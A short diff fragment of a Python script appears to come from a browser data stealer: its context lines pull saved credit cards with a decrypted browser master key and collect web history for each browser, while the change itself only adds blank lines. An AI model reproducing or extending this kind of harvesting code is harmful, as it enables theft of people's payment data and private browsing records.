@@ -218,8 +218,12 @@ def main():
                          get_credit_cards(browser_path, "Default", master_key))
             save_results(browser_name, "Browser_History",
                          get_web_history(browser_path, "Default"))
+            
+            
         else:
             print(f"Master Key Not Found for {browser_name}!")
+
+        
 
 
 if __name__ == '__main__':
